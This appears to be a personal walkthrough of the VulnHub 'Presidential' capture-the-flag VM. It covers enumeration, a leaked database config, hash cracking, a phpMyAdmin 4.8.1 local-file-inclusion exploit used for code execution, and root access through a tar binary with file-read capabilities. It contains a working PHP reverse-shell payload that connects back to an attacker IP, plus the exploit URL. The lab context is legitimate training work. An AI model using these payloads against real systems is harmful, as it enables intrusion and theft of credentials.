
---

Presidential Link: https://www.vulnhub.com/entry/presidential-1,500/

\[OS]: CentOS
\[Web-Technology]:  Apache httpd 2.4.6, PHP/5.5.38
\[Hostname]:  Presidential
\[IP]:  192.168.56.119
\[USERS]:   
\[CREDENTIALS]:  

datasafe.votenow.local - votebox :: casoj3FFASPsbyoRP
admin :: Stella

---
\[To-Try LIST]:  

80 - http Apache

2082 - ssh - needs credentials


---
\[NMAP RESULTS]:  
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.5.38)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Ontario Election Services &raquo; Vote Now!
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.5.38
2082/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 06:40:f4:e5:8c:ad:1a:e6:86:de:a5:75:d0:a2:ac:80 (RSA)
|   256 e9:e6:3a:83:8e:94:f2:98:dd:3e:70:fb:b9:a3:e3:99 (ECDSA)
|_  256 66:a8:a1:9f:db:d5:ec:4c:0a:9c:4d:53:15:6c:43:6c (ED25519)


--- 

\[Web Services Enumeration]:   
**Port 80**


Found email - potential domain:
contact@votenow.local 

Add votenow.local to /etc/hosts
This works

Source Code -> Flattern v2.1.0 (bootstrapmade.com) -> no vulns here
```bash
searchsploit php 5.5.38 #tons of results but most are php scripts not php weaknesses - remember 35146.txt and 2047.py

#gobuster for $IP
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40

/assets

dirb $URL
/cgi-bin/
/index.html

#gobuster for votenow.local
/assets

/cgi-bin/
/index.html

## Now check for files: php, php.bak,html,txt,bak,old  
gobuster dir -u $URL -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 40 -x php,php.bak,html,txt,bak,old  

/config.php.bak # -> blank page but check source

#<?php
#$dbUser = "votebox";
#$dbPass = "casoj3FFASPsbyoRP";
#$dbHost = "localhost";
#$dbname = "votebox";
#?>

# SSH denied

# Find subdomains
wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H "HOST: FUZZ.votenow.local" --hw 854 --hc 400 -t 100 192.168.56.119

"datasafe" #add datasafe.votenow.local to /etc/hosts

Login with votebox :: casoj3FFASPsbyoRP

#Visit datasafe.votenow.local -> phpMyAdmin login

# Before we get to that lets explore

Database votebox - table users

admin :: $2y$12$d/nOEjKNgk/epF2BeAFaMu8hW4ae3JJk8ITyh48q97awT/G7eQ11i

# crack yescrypt hash with jtr or hc
john --wordlist=/usr/share/wordlists/rockyou.txt admin.hash 

admin :: Stella

ssh admin@$IP -p 2082 # still denied

whatweb datasafe.votenow.local -> phpMyAdmin 4.8.1
searchsploit phpmyadmin 4.8.1 -> LFI and RCE

searchsploit -m 44928 #LFI

# 1. Run SQL Query : 
select '<?php phpinfo();exit;?>'
# 2. Include the session file :
http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k    


# we can test with that or yolo it with
select '<?php system("bash -i >& /dev/tcp/192.168.56.101/4444 0>&1");exit;?>'


http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/session/sess_pteba2omra9b0nlku0b89mtrs4si9002


```
![[Pasted image 20251101130620.png]]

![[Pasted image 20251101132851.png]]
![[Pasted image 20251101132700.png]]
![[Pasted image 20251101134043.png]]



---


\[OTHER / PRIVILEGE-ESCALATION]:   


```bash

# Get persistence
# which - python, perl, wget, curl

whoami - apache
su - admin #Stella

[admin@votenow ~]$ cat user.txt 
663ba6a402a57536772c6118e8181570


[admin@votenow ~]$ cat notes.txt 
Reminders:

1) Utilise new commands to backup and compress sensitive files



getcap -r / 2>/dev/null

/usr/bin/tarS = cap_dac_read_search+ep #like domdom can compress key files

[admin@votenow ~]$ /usr/bin/tarS -cvf id.tar /root/.ssh/id_rsa
[admin@votenow ~]$ tar -xvf id.tar
[admin@votenow ~]$ cat ~/root/.ssh/id_rsa  #success
[admin@votenow .ssh]$ ssh -i id_rsa root@192.168.56.119 -p 2082


[root@votenow ~]# whoami 
root
```
![[Pasted image 20251101135230.png]]

--- 
Take Away Concepts: 



HOTKEYS! 
Background: Black 
Foreground (important elements): Red 
Background-Color: Select Text > Shift + Alt + B + ENTER 
Foreground Color: Select Text > Shift + Alt + F + ENTER 
Move quickly with: Function key + left and right arrows 
Cntrl + left and right arrows 
Cntrl + Shift (select text) (edited)
